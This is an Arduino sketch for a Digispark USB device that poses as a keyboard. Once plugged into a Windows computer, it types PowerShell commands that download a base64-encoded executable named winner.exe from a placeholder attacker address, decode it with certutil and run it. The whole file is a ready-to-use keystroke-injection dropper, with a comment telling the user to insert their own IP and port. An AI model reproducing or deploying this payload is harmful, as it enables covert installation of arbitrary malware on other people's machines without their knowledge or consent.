#include "DigiKeyboard.h"

void setup() {
  delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  delay(500);
  DigiKeyboard.print("powershell");
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(5000);

  DigiKeyboard.print("cd C:/Users/$env:username/AppData/Local/Temp");
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);

  DigiKeyboard.print("rm winner.exe*");
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);

  DigiKeyboard.print("wget ");
  DigiKeyboard.print("http://X.X.X.X:XXXX/winner.exe.b64"); // Replace this IP address with your IP and PORT
  DigiKeyboard.print(" -o winner.exe.b64");
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);

  DigiKeyboard.print("certutil -decode winner.exe.b64 winner.exe");
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);

  DigiKeyboard.print("./winner.exe");
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);
}

void loop() {
  //empty
}
